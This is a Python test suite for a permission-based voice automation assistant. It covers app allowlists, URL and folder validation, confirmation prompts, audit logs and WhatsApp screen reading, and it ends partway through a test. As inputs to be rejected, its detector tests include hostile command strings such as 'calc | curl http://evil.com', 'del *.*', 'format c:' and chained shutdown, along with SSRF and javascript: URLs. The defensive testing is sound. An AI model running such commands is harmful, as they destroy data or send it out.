"""
Comprehensive Test Suite for SG CUBE 2.5 Feature 9: Permission-Based System Automation
Covers:
- Safe allowlist registry & alias resolution
- Shell & script execution prevention (zero shell=True, zero cmd/powershell/eval)
- URL validation, domain allowlists, and SSRF/dangerous protocol rejection
- Folder path validation & traversal prevention
- Granular permissions (ALLOWED, ASK_EACH_TIME, DENIED) and persistence
- Risk level classification & Voice Security Password integration
- Continuous conversation confirmation, TTL eviction, and pronoun resolution (Feature 6)
- Document OCR prompt injection isolation (Feature 8)
- In-RAM transient audit logging
- Command router intent parsing
- VisionEngine end-to-end execution
"""

import os
import time
import shutil
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from assistive.automation_manager import (
    AutomationManager,
    AutomationRiskLevel,
    AutomationPermission,
    AutomationActionType,
    AutomationResultStatus,
    AutomationRequest,
    AutomationResult,
    AutomationActionDefinition,
    AutomationAuditRecord
)
from assistive.conversation_context import (
    ConversationContextManager,
    ConversationState,
    TopicType,
    ActiveAutomationRef
)
from assistive.ui_automation_manager import (
    UIAutomationManager,
    UIAppType,
    UIWindowInfo,
    WhatsAppChatMessage,
    WhatsAppScreenState
)
from assistive.command_router import CommandRouter
from assistive.security_manager import SecurityManager, SecurityLevel
from assistive.vision_engine import VisionEngine


class TestAutomationManagerAllowlist(unittest.TestCase):
    """Tests application allowlist resolution and prohibited input detection."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_approved_app_calculator(self):
        defn = self.mgr.resolve_app("calculator")
        self.assertIsNotNone(defn)
        self.assertEqual(defn.display_name, "Calculator")
        self.assertIn("calc.exe", defn.executable_candidates)

    def test_approved_app_aliases(self):
        self.assertIsNotNone(self.mgr.resolve_app("calc"))
        self.assertIsNotNone(self.mgr.resolve_app("the calculator"))
        self.assertIsNotNone(self.mgr.resolve_app("notepad"))
        self.assertIsNotNone(self.mgr.resolve_app("text editor"))
        self.assertIsNotNone(self.mgr.resolve_app("file explorer"))
        self.assertIsNotNone(self.mgr.resolve_app("explorer"))
        self.assertIsNotNone(self.mgr.resolve_app("browser"))
        self.assertIsNotNone(self.mgr.resolve_app("chrome"))
        self.assertIsNotNone(self.mgr.resolve_app("edge"))

    def test_unapproved_app_rejection(self):
        self.assertIsNone(self.mgr.resolve_app("cmd.exe"))
        self.assertIsNone(self.mgr.resolve_app("powershell.exe"))
        self.assertIsNone(self.mgr.resolve_app("malware.exe"))
        self.assertIsNone(self.mgr.resolve_app("random_program"))

    def test_close_target_resolution(self):
        close_calc = self.mgr.resolve_close_target("calculator")
        self.assertIsNotNone(close_calc)
        self.assertEqual(close_calc[0], "Calculator")
        self.assertIn("calc.exe", close_calc[1])

        close_notepad = self.mgr.resolve_close_target("notepad")
        self.assertIsNotNone(close_notepad)
        self.assertEqual(close_notepad[0], "Notepad")

        self.assertIsNone(self.mgr.resolve_close_target("unknown_app"))

    def test_malicious_input_detection(self):
        self.assertTrue(self.mgr.is_malicious_input("powershell -ExecutionPolicy Bypass"))
        self.assertTrue(self.mgr.is_malicious_input("cmd.exe /c calc"))
        self.assertTrue(self.mgr.is_malicious_input("format c:"))
        self.assertTrue(self.mgr.is_malicious_input("calc.exe ; del *.*"))
        self.assertTrue(self.mgr.is_malicious_input("notepad && shutdown"))
        self.assertTrue(self.mgr.is_malicious_input("calc | curl http://evil.com"))
        self.assertTrue(self.mgr.is_malicious_input("echo `whoami`"))
        self.assertFalse(self.mgr.is_malicious_input("calculator"))
        self.assertFalse(self.mgr.is_malicious_input("notepad"))


class TestAutomationURLValidation(unittest.TestCase):
    """Tests URL validation, scheme filtering, and SSRF prevention."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_valid_https_urls(self):
        valid, url, domain = self.mgr.validate_url("https://www.google.com")
        self.assertTrue(valid)
        self.assertEqual(domain, "www.google.com")

        valid, url, domain = self.mgr.validate_url("google.com")
        self.assertTrue(valid)
        self.assertEqual(url, "https://google.com")
        self.assertEqual(domain, "google.com")

        valid, url, domain = self.mgr.validate_url("https://en.wikipedia.org/wiki/Main_Page")
        self.assertTrue(valid)
        self.assertEqual(domain, "en.wikipedia.org")

    def test_reject_dangerous_schemes(self):
        # javascript: scheme
        valid, msg, _ = self.mgr.validate_url("javascript:alert(1)")
        self.assertFalse(valid)

        # file: scheme
        valid, msg, _ = self.mgr.validate_url("file:///C:/Windows/System32/calc.exe")
        self.assertFalse(valid)

        # data: scheme
        valid, msg, _ = self.mgr.validate_url("data:text/html,<h1>evil</h1>")
        self.assertFalse(valid)

        # vbscript: scheme
        valid, msg, _ = self.mgr.validate_url("vbscript:msgbox(1)")
        self.assertFalse(valid)

    def test_reject_localhost_loopback_ssrf(self):
        valid, msg, _ = self.mgr.validate_url("http://localhost:8080/admin")
        self.assertFalse(valid)

        valid, msg, _ = self.mgr.validate_url("http://127.0.0.1:5000")
        self.assertFalse(valid)

        valid, msg, _ = self.mgr.validate_url("http://0.0.0.0/")
        self.assertFalse(valid)

    def test_reject_injection_characters_in_url(self):
        valid, msg, _ = self.mgr.validate_url("https://google.com; calc.exe")
        self.assertFalse(valid)

        valid, msg, _ = self.mgr.validate_url("https://google.com && powershell")
        self.assertFalse(valid)


class TestAutomationFolderValidation(unittest.TestCase):
    """Tests folder path validation, user folder scoping, and traversal prevention."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_valid_user_folders(self):
        valid, path, name = self.mgr.validate_folder_path("documents")
        self.assertTrue(valid)
        self.assertEqual(name, "Documents")

        valid, path, name = self.mgr.validate_folder_path("downloads")
        self.assertTrue(valid)
        self.assertEqual(name, "Downloads")

        valid, path, name = self.mgr.validate_folder_path("desktop")
        self.assertTrue(valid)
        self.assertEqual(name, "Desktop")

        valid, path, name = self.mgr.validate_folder_path("pictures")
        self.assertTrue(valid)
        self.assertEqual(name, "Pictures")

    def test_reject_directory_traversal(self):
        valid, msg, _ = self.mgr.validate_folder_path("../../../Windows")
        self.assertFalse(valid)
        self.assertIn("traversal", msg.lower())

    def test_reject_system_root(self):
        valid, msg, _ = self.mgr.validate_folder_path("C:\\Windows")
        self.assertFalse(valid)

        valid, msg, _ = self.mgr.validate_folder_path("C:\\Windows\\System32")
        self.assertFalse(valid)


class TestAutomationPermissions(unittest.TestCase):
    """Tests permission loading, updating, persistence, and defaults."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_default_permissions(self):
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_APP), AutomationPermission.ALLOWED)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.CLOSE_APP), AutomationPermission.ASK_EACH_TIME)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_URL), AutomationPermission.ALLOWED)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_FOLDER), AutomationPermission.ASK_EACH_TIME)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.LOCK_WORKSTATION), AutomationPermission.ASK_EACH_TIME)

    def test_set_and_save_permission(self):
        self.mgr.set_permission(AutomationActionType.OPEN_APP, AutomationPermission.ASK_EACH_TIME)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_APP), AutomationPermission.ASK_EACH_TIME)

        # Reload from new instance
        new_mgr = AutomationManager(pref_dir=self.temp_dir)
        self.assertEqual(new_mgr.get_permission(AutomationActionType.OPEN_APP), AutomationPermission.ASK_EACH_TIME)

    def test_denied_permission_blocks_execution(self):
        self.mgr.set_permission(AutomationActionType.OPEN_APP, AutomationPermission.DENIED)
        req = self.mgr.create_request(AutomationActionType.OPEN_APP, "calculator")
        self.assertEqual(req.permission, AutomationPermission.DENIED)
        self.assertEqual(req.risk_level, AutomationRiskLevel.BLOCKED)

        res = self.mgr.execute_request(req)
        self.assertEqual(res.status, AutomationResultStatus.BLOCKED)


class TestAutomationExecutionAndConfirmation(unittest.TestCase):
    """Tests request creation, confirmation gates, and direct execution."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_create_open_app_request_allowed(self):
        req = self.mgr.create_request(AutomationActionType.OPEN_APP, "calculator")
        self.assertEqual(req.action_type, AutomationActionType.OPEN_APP)
        self.assertEqual(req.display_name, "Calculator")
        self.assertEqual(req.permission, AutomationPermission.ALLOWED)
        self.assertFalse(req.requires_confirmation)

    def test_create_close_app_request_requires_confirmation(self):
        req = self.mgr.create_request(AutomationActionType.CLOSE_APP, "calculator")
        self.assertEqual(req.action_type, AutomationActionType.CLOSE_APP)
        self.assertTrue(req.requires_confirmation)

        res = self.mgr.execute_request(req, confirmed=False)
        self.assertEqual(res.status, AutomationResultStatus.REQUIRES_CONFIRMATION)
        self.assertIn("close Calculator", res.spoken_response)

    @patch("subprocess.Popen")
    def test_execute_open_app_success(self, mock_popen):
        mock_proc = MagicMock()
        mock_proc.pid = 12345
        mock_popen.return_value = mock_proc

        req = self.mgr.create_request(AutomationActionType.OPEN_APP, "calculator")
        res = self.mgr.execute_request(req)

        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)
        self.assertEqual(res.pid, 12345)
        self.assertIn("Calculator", res.spoken_response)
        mock_popen.assert_called_once()
        # Verify shell=False is strictly used
        self.assertFalse(mock_popen.call_args[1].get("shell", False))

    @patch("subprocess.run")
    def test_execute_close_app_confirmed(self, mock_run):
        mock_run.return_value = MagicMock(returncode=0)

        req = self.mgr.create_request(AutomationActionType.CLOSE_APP, "calculator")
        res = self.mgr.execute_request(req, confirmed=True)

        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)
        self.assertIn("closed Calculator", res.spoken_response)

    @patch("webbrowser.open_new_tab")
    def test_execute_open_url_success(self, mock_open):
        req = self.mgr.create_request(AutomationActionType.OPEN_URL, "https://google.com")
        res = self.mgr.execute_request(req)

        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)
        self.assertIn("google.com", res.spoken_response)
        mock_open.assert_called_once_with("https://google.com")

    def test_execute_copy_text_success(self):
        req = self.mgr.create_request(AutomationActionType.COPY_TEXT, "Hello SG CUBE Automation")
        res = self.mgr.execute_request(req)
        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)
        self.assertIn("clipboard", res.spoken_response.lower())

    @patch("ctypes.windll.user32.LockWorkStation", create=True)
    def test_execute_lock_workstation_confirmed(self, mock_lock):
        mock_lock.return_value = 1
        req = self.mgr.create_request(AutomationActionType.LOCK_WORKSTATION, "workstation")
        res = self.mgr.execute_request(req, confirmed=True)
        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)


class TestAutomationSecurityIntegration(unittest.TestCase):
    """Tests Voice Security Password integration with AutomationManager."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.sec = SecurityManager(pref_dir=self.temp_dir)
        self.mgr = AutomationManager(pref_dir=self.temp_dir, security_manager=self.sec)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_protected_action_requires_security_auth_when_configured(self):
        # Set voice security password
        ok, msg, rc = self.sec.set_password("open sesame river")
        self.assertTrue(ok)
        self.assertTrue(self.sec.is_configured())
        self.sec.lock_session()

        req = self.mgr.create_request(AutomationActionType.CLOSE_APP, "calculator")
        self.assertTrue(req.requires_security_auth)

        # Attempt without authorization
        res = self.mgr.execute_request(req, security_authorized=False)
        self.assertEqual(res.status, AutomationResultStatus.REQUIRES_SECURITY_AUTH)
        self.assertIn("Voice Security Password", res.spoken_response)

    def test_authorized_session_bypasses_security_challenge(self):
        ok, msg, rc = self.sec.set_password("open sesame river")
        self.assertTrue(ok)
        self.sec.authorize_session(60.0)
        self.assertTrue(self.sec.is_session_authorized())

        req = self.mgr.create_request(AutomationActionType.CLOSE_APP, "calculator")
        res = self.mgr.execute_request(req, confirmed=True)
        self.assertEqual(res.status, AutomationResultStatus.SUCCESS)


class TestAutomationDocumentIsolation(unittest.TestCase):
    """Tests Feature 8 document OCR prompt injection isolation."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_document_isolated_source_blocks_automation(self):
        req = self.mgr.create_request(
            action_type=AutomationActionType.OPEN_APP,
            target="calculator",
            source="document_isolated"
        )
        self.assertEqual(req.risk_level, AutomationRiskLevel.BLOCKED)
        self.assertEqual(req.permission, AutomationPermission.DENIED)

        res = self.mgr.execute_request(req)
        self.assertEqual(res.status, AutomationResultStatus.BLOCKED)


class TestAutomationAuditLogging(unittest.TestCase):
    """Tests in-RAM audit logging and credential sanitization."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_audit_records_recorded(self):
        req = self.mgr.create_request(AutomationActionType.STATUS, "system")
        self.mgr.execute_request(req)

        logs = self.mgr.get_audit_log()
        self.assertEqual(len(logs), 1)
        self.assertEqual(logs[0]["action_type"], "STATUS")
        self.assertEqual(logs[0]["status"], "SUCCESS")

    def test_copy_text_sanitized_in_audit(self):
        req = self.mgr.create_request(AutomationActionType.COPY_TEXT, "A" * 100)
        self.mgr.execute_request(req)

        logs = self.mgr.get_audit_log()
        self.assertEqual(len(logs), 1)
        self.assertIn("[truncated]", logs[0]["target"])


class TestAutomationCommandRouter(unittest.TestCase):
    """Tests natural language intent routing for automation commands."""

    def setUp(self):
        self.router = CommandRouter()

    def test_route_open_app_calculator(self):
        r = self.router.route_intent("Open calculator")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_APP")
        self.assertEqual(r["target"], "calculator")

        r = self.router.route_intent("Please launch notepad")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_APP")
        self.assertEqual(r["target"], "notepad")

        r = self.router.route_intent("Start file explorer")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_APP")
        self.assertEqual(r["target"], "file explorer")

    def test_route_close_app_calculator(self):
        r = self.router.route_intent("Close calculator")
        self.assertEqual(r["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(r["target"], "calculator")

        r = self.router.route_intent("Exit notepad")
        self.assertEqual(r["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(r["target"], "notepad")

    def test_route_open_url(self):
        r = self.router.route_intent("Open website google.com")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_URL")
        self.assertEqual(r["target"], "google.com")

        r = self.router.route_intent("Go to github.com")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_URL")
        self.assertEqual(r["target"], "github.com")

    def test_route_open_folder(self):
        r = self.router.route_intent("Open documents folder")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_FOLDER")
        self.assertEqual(r["target"], "documents")

        r = self.router.route_intent("Open my downloads")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_FOLDER")
        self.assertEqual(r["target"], "downloads")

    def test_route_copy_text(self):
        r = self.router.route_intent("Copy text meeting tomorrow at 3 PM")
        self.assertEqual(r["intent"], "AUTOMATION_COPY_TEXT")
        self.assertEqual(r["target"].lower(), "meeting tomorrow at 3 pm")

    def test_route_lock_workstation(self):
        r = self.router.route_intent("Lock my workstation")
        self.assertEqual(r["intent"], "AUTOMATION_LOCK_DEVICE")

        r = self.router.route_intent("Lock screen")
        self.assertEqual(r["intent"], "AUTOMATION_LOCK_DEVICE")

    def test_route_status(self):
        r = self.router.route_intent("Automation status")
        self.assertEqual(r["intent"], "AUTOMATION_STATUS")


class TestAutomationConversationContext(unittest.TestCase):
    """Tests multi-turn context, confirmations, and pronoun resolution with Feature 6."""

    def setUp(self):
        self.ctx = ConversationContextManager()

    def test_pending_automation_confirmation_affirmative(self):
        req = AutomationRequest(
            request_id="req_123",
            action_type=AutomationActionType.CLOSE_APP,
            target="calculator",
            display_name="Calculator"
        )
        self.ctx.set_pending_automation(req)
        self.assertEqual(self.ctx.state, ConversationState.AWAITING_CONFIRMATION)

        res = self.ctx.resolve_followup_intent("Yes, please do")
        self.assertTrue(res["is_followup"])
        self.assertEqual(res["intent"], "AUTOMATION_CONFIRM")
        self.assertEqual(res["resolved_target"], "calculator")
        self.assertIsNone(self.ctx.get_pending_automation())

    def test_pending_automation_cancellation(self):
        req = AutomationRequest(
            request_id="req_123",
            action_type=AutomationActionType.CLOSE_APP,
            target="calculator",
            display_name="Calculator"
        )
        self.ctx.set_pending_automation(req)

        res = self.ctx.resolve_followup_intent("No, cancel that")
        self.assertTrue(res["is_followup"])
        self.assertEqual(res["intent"], "AUTOMATION_CANCEL")
        self.assertIsNone(self.ctx.get_pending_automation())

    def test_automation_pronoun_followup_close_it(self):
        self.ctx.set_active_automation(
            action_type=AutomationActionType.OPEN_APP.value,
            target="calculator",
            display_name="Calculator"
        )
        res = self.ctx.resolve_followup_intent("Close it")
        self.assertTrue(res["is_followup"])
        self.assertEqual(res["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(res["resolved_target"], "Calculator")

    def test_automation_context_summary(self):
        self.ctx.set_active_automation(
            action_type=AutomationActionType.OPEN_APP.value,
            target="calculator",
            display_name="Calculator"
        )
        summary = self.ctx.get_context_summary()
        self.assertEqual(summary["topic"], "System Automation")
        self.assertEqual(summary["active_entity"], "Calculator")


class TestAutomationVisionEngineIntegration(unittest.TestCase):
    """End-to-end integration tests through VisionEngine."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.engine = VisionEngine(data_dir=self.temp_dir)

    def tearDown(self):
        if hasattr(self.engine, "scheduler"):
            self.engine.scheduler.stop()
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    @patch("subprocess.Popen")
    def test_vision_engine_open_app_query(self, mock_popen):
        mock_proc = MagicMock()
        mock_proc.pid = 9999
        mock_popen.return_value = mock_proc

        resp = self.engine.process_user_speech_query("Open calculator")
        self.assertIn("opened Calculator", resp)
        self.assertEqual(self.engine.context.active_topic, TopicType.SYSTEM_AUTOMATION)

    def test_vision_engine_close_app_confirmation_flow(self):
        # 1. User says "Close calculator"
        resp1 = self.engine.process_user_speech_query("Close calculator")
        self.assertIn("Do you want me to close Calculator?", resp1)
        self.assertEqual(self.engine.context.state, ConversationState.AWAITING_CONFIRMATION)

        # 2. User confirms with "Yes, confirm"
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            resp2 = self.engine.process_user_speech_query("Yes, confirm")
            self.assertIn("closed Calculator", resp2)

    def test_vision_engine_close_app_cancel_flow(self):
        resp1 = self.engine.process_user_speech_query("Close calculator")
        self.assertIn("Do you want me to close Calculator?", resp1)

        resp2 = self.engine.process_user_speech_query("No, don't do it")
        self.assertIn("Action cancelled", resp2)

    def test_vision_engine_automation_status_query(self):
        resp = self.engine.process_user_speech_query("Automation status")
        self.assertIn("System automation is active", resp)


class TestAutomationEdgeCasesAndPolicies(unittest.TestCase):
    """Additional edge cases, policy checks, and TTL tests."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)
        self.ctx = ConversationContextManager()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_reset_permissions_to_defaults(self):
        self.mgr.set_permission(AutomationActionType.OPEN_APP, AutomationPermission.DENIED)
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_APP), AutomationPermission.DENIED)
        self.mgr.reset_permissions_to_defaults()
        self.assertEqual(self.mgr.get_permission(AutomationActionType.OPEN_APP), AutomationPermission.ALLOWED)

    def test_get_all_permissions_dictionary(self):
        perms = self.mgr.get_all_permissions()
        self.assertIsInstance(perms, dict)
        self.assertIn(AutomationActionType.OPEN_APP.value, perms)
        self.assertIn(AutomationActionType.CLOSE_APP.value, perms)

    def test_set_permission_invalid_string(self):
        res = self.mgr.set_permission(AutomationActionType.OPEN_APP, "INVALID_POLICY")
        self.assertFalse(res)

    def test_validate_url_with_paths_and_queries(self):
        valid, url, domain = self.mgr.validate_url("https://en.wikipedia.org/wiki/Artificial_intelligence?ref=sgcube")
        self.assertTrue(valid)
        self.assertEqual(domain, "en.wikipedia.org")

    def test_validate_url_empty_and_none(self):
        valid, msg, domain = self.mgr.validate_url("")
        self.assertFalse(valid)
        valid, msg, domain = self.mgr.validate_url(None)
        self.assertFalse(valid)

    def test_validate_folder_music_videos_home(self):
        valid, path, name = self.mgr.validate_folder_path("music")
        self.assertTrue(valid)
        valid, path, name = self.mgr.validate_folder_path("videos")
        self.assertTrue(valid)
        valid, path, name = self.mgr.validate_folder_path("home")
        self.assertTrue(valid)

    def test_validate_folder_empty_and_none(self):
        valid, msg, name = self.mgr.validate_folder_path("")
        self.assertFalse(valid)
        valid, msg, name = self.mgr.validate_folder_path(None)
        self.assertFalse(valid)

    def test_audit_log_ring_buffer_capacity(self):
        for i in range(60):
            req = self.mgr.create_request(AutomationActionType.STATUS, f"system_{i}")
            self.mgr.execute_request(req)
        logs = self.mgr.get_audit_log()
        self.assertEqual(len(logs), 50)  # Capped at maxlen 50

    def test_audit_log_clear(self):
        req = self.mgr.create_request(AutomationActionType.STATUS, "system")
        self.mgr.execute_request(req)
        self.assertEqual(len(self.mgr.get_audit_log()), 1)
        self.mgr.clear_audit_log()
        self.assertEqual(len(self.mgr.get_audit_log()), 0)

    def test_automation_request_expiration_ttl(self):
        req = AutomationRequest(
            request_id="req_001",
            action_type=AutomationActionType.OPEN_APP,
            target="calculator",
            display_name="Calculator",
            created_at=100.0
        )
        self.assertFalse(req.is_expired(ttl_seconds=60.0, current_time=150.0))
        self.assertTrue(req.is_expired(ttl_seconds=60.0, current_time=165.0))

    def test_active_automation_ref_expiration_ttl(self):
        ref = ActiveAutomationRef(
            action_type=AutomationActionType.OPEN_APP.value,
            target="calculator",
            display_name="Calculator",
            timestamp=100.0
        )
        self.assertFalse(ref.is_expired(ttl_seconds=60.0, current_time=150.0))
        self.assertTrue(ref.is_expired(ttl_seconds=60.0, current_time=165.0))

    def test_context_manager_prune_stale_automation(self):
        self.ctx.set_active_automation(
            action_type=AutomationActionType.OPEN_APP.value,
            target="calculator",
            display_name="Calculator",
            current_time=100.0
        )
        req = AutomationRequest(
            request_id="req_pending",
            action_type=AutomationActionType.CLOSE_APP,
            target="calculator",
            display_name="Calculator",
            created_at=100.0
        )
        self.ctx.set_pending_automation(req)

        # Before TTL expiration
        self.ctx.prune_stale(current_time=140.0)
        self.assertIsNotNone(self.ctx.active_automation)
        self.assertIsNotNone(self.ctx.pending_automation)

        # After TTL expiration
        self.ctx.prune_stale(current_time=170.0)
        self.assertIsNone(self.ctx.active_automation)
        self.assertIsNone(self.ctx.pending_automation)
        self.assertEqual(self.ctx.state, ConversationState.IDLE)

    def test_command_router_quit_exit_terminology(self):
        router = CommandRouter()
        r = router.route_intent("Quit calculator")
        self.assertEqual(r["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(r["target"], "calculator")

        r = router.route_intent("Exit notepad")
        self.assertEqual(r["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(r["target"], "notepad")

        r = router.route_intent("Terminate browser")
        self.assertEqual(r["intent"], "AUTOMATION_CLOSE_APP")
        self.assertEqual(r["target"], "browser")

    def test_command_router_visit_navigate_terminology(self):
        router = CommandRouter()
        r = router.route_intent("Visit python.org")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_URL")
        self.assertEqual(r["target"], "python.org")

        r = router.route_intent("Navigate to duckduckgo.com")
        self.assertEqual(r["intent"], "AUTOMATION_OPEN_URL")
        self.assertEqual(r["target"], "duckduckgo.com")


class TestUIAutomationAndWhatsApp(unittest.TestCase):
    """
    Tests for SG CUBE 2.5 Controlled UI Automation & WhatsApp Integration:
    - Active window detection & classification
    - App lock perception & safe refusal
    - Main content extraction ("read screen") across apps
    - WhatsApp two-step send message confirmation lifecycle
    - Command routing & VisionEngine end-to-end flows
    """

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.mgr = AutomationManager(pref_dir=self.temp_dir)
        self.ui = self.mgr.ui_automation
        self.router = CommandRouter()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_whatsapp_allowlist_resolution(self):
        # Resolve WhatsApp and aliases
        defn1 = self.mgr.resolve_app("whatsapp")
        self.assertIsNotNone(defn1)
        self.assertEqual(defn1.display_name, "WhatsApp")
        self.assertIn("WhatsApp.exe", defn1.executable_candidates)

        defn2 = self.mgr.resolve_app("whats app")
        self.assertIsNotNone(defn2)
        self.assertEqual(defn2.display_name, "WhatsApp")

        close_wa = self.mgr.resolve_close_target("whatsapp")
        self.assertIsNotNone(close_wa)
        self.assertEqual(close_wa[0], "WhatsApp")

    def test_app_classification(self):
        self.assertEqual(self.ui.classify_app_type("WhatsApp"), UIAppType.WHATSAPP)
        self.assertEqual(self.ui.classify_app_type("Untitled - Notepad"), UIAppType.NOTEPAD)
        self.assertEqual(self.ui.classify_app_type("Calculator"), UIAppType.CALCULATOR)
        self.assertEqual(self.ui.classify_app_type("Documents", class_name="CabinetWClass"), UIAppType.EXPLORER)
        self.assertEqual(self.ui.classify_app_type("Google - Google Chrome"), UIAppType.BROWSER)
        self.assertEqual(self.ui.classify_app_type("Custom Game"), UIAppType.UNKNOWN)

    def test_app_lock_detection_whatsapp(self):
        # Mock locked state
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=True,
            lock_prompt="WhatsApp is locked. Please unlock it to proceed."
        )
        is_locked, msg = self.ui.is_app_locked("whatsapp")
        self.assertTrue(is_locked)
        self.assertEqual(msg, "WhatsApp is locked. Please unlock it to proceed.")

        # Read screen when locked
        res = self.ui.read_screen_content("whatsapp")
        self.assertEqual(res["status"], "LOCKED")
        self.assertEqual(res["spoken_response"], "WhatsApp is locked. Please unlock it to proceed.")

    def test_read_screen_whatsapp_active_chat(self):
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=False,
            active_chat_name="Mom",
            messages=[
                WhatsAppChatMessage(sender="Mom", text="Are you coming home for dinner?", timestamp_str="6:30 PM"),
                WhatsAppChatMessage(sender="You", text="Yes, I am leaving now.", timestamp_str="6:32 PM"),
                WhatsAppChatMessage(sender="Mom", text="Great, drive safely!", timestamp_str="6:33 PM")
            ]
        )
        res = self.ui.read_screen_content("whatsapp")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertIn("You are in chat with Mom", res["spoken_response"])
        self.assertIn("Great, drive safely!", res["spoken_response"])

    def test_read_screen_whatsapp_chats_list(self):
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=False,
            active_chat_name=None,
            recent_chat_names=["Mom", "Alex", "Project Team", "Family Group"]
        )
        res = self.ui.read_screen_content("whatsapp")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertIn("recent conversations: Mom, Alex, Project Team, Family Group", res["spoken_response"])

    def test_read_screen_notepad(self):
        self.ui._mock_notepad_content = "Meeting notes:\n1. Prepare SG CUBE 2.5 release\n2. Review UI automation"
        res = self.ui.read_screen_content("notepad")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertIn("Notepad contains: 'Meeting notes", res["spoken_response"])

    def test_read_screen_notepad_empty(self):
        self.ui._mock_notepad_content = ""
        res = self.ui.read_screen_content("notepad")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertEqual(res["spoken_response"], "Notepad is currently empty.")

    def test_read_screen_calculator(self):
        self.ui._mock_calc_result = "42"
        res = self.ui.read_screen_content("calculator")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertEqual(res["spoken_response"], "Calculator display shows 42.")

    def test_read_screen_explorer(self):
        self.ui._mock_explorer_state = {
            "folder": "Documents",
            "items": ["report.pdf", "notes.txt", "budget.xlsx"]
        }
        res = self.ui.read_screen_content("explorer")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertIn("File Explorer is open at Documents", res["spoken_response"])
        self.assertIn("report.pdf", res["spoken_response"])

    def test_read_screen_browser(self):
        self.ui._mock_browser_state = {"title": "Google Search"}
        res = self.ui.read_screen_content("browser")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertEqual(res["spoken_response"], "Browser is open to Google Search.")

    def test_read_screen_browser_with_content(self):
        self.ui._mock_browser_state = {
            "title": "Wikipedia - Artificial Intelligence",
            "content": "Artificial intelligence is the intelligence of machines or software, as opposed to the intelligence of living beings."
        }
        res = self.ui.read_screen_content("browser")
        self.assertEqual(res["status"], "SUCCESS")
        self.assertIn("You are viewing Wikipedia - Artificial Intelligence", res["spoken_response"])
        self.assertIn("Artificial intelligence is the intelligence of machines", res["spoken_response"])

    def test_open_chat_with_contact(self):
        ok, msg = self.ui.open_chat_with("Mom")
        self.assertTrue(ok)
        self.assertEqual(msg, "Opened chat with Mom.")

    def test_open_chat_locked_error(self):
        self.ui._mock_whatsapp_state = WhatsAppScreenState(
            is_open=True,
            is_locked=True
        )
        ok, msg = self.ui.open_chat_with("Mom")
        self.assertFalse(ok)
        self.assertIn("WhatsApp is locked", msg)

    def test_whatsapp_message_send_flow(self):
        # 1. Draft preparation
        draft = self.ui.prepare_send_message("Mom", "I will be late")
